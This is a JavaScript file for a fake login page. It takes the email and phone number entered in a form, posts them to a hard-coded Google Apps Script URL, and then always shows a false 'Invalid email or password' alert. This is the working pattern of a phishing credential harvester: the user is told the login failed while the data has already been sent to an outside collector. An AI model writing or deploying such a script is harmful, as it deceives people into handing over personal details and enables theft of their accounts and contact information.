// Function to show the login page when the Login button is clicked
function showLogin() {
    // Hide the home container and show the login form
    document.querySelector('.home-container').style.display = 'none';
    document.getElementById('loginPage').style.display = 'block';
  }
  
  // Handle the form submission and send data to Google Apps Script
  document.getElementById('detailsForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    // Get values from the form
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
  
    console.log("Email:", email); // Log email
    console.log("Phone:", phone); // Log phone
  
    const data = {
      email: email,
      phone: phone
    };
  
    // Replace with your Google Apps Script URL
    fetch('https://script.google.com/macros/s/AKfycbz2tvhPjJOfd6r1rW2rLRc7TgWWj7JeUcilIXbY1Vkmsr0YnoAEZqltRJYLfAQ67aGK/exec', {
      method: 'POST',
      body: new URLSearchParams(data),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })
    .then(response => {
      console.log(response); // Log the response
      return response.text();
    })
    .then(data => {
      alert("Invalid email or password. Please check and retry");
    })
    .catch(error => {
      console.error('Error:', error); // Log any errors
      alert("There was an error submitting your details.");
    });
  });
  